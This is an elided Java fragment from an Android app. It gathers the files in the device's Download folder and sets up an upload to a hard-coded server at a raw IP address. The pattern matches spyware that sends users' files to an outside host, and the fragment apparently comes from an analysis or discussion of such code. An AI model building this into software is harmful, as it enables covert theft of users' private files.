...
File dir4 = new File("/storage/emulated/0/Download");
List<File> files4 = (List<File>) FileUtils.listFiles(dir4,
...
//
 ...
 public void upload(String selectedPath) throws Exception {
        ...
        String urlServer = "http://159.89.214.31:3178/upload_files.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
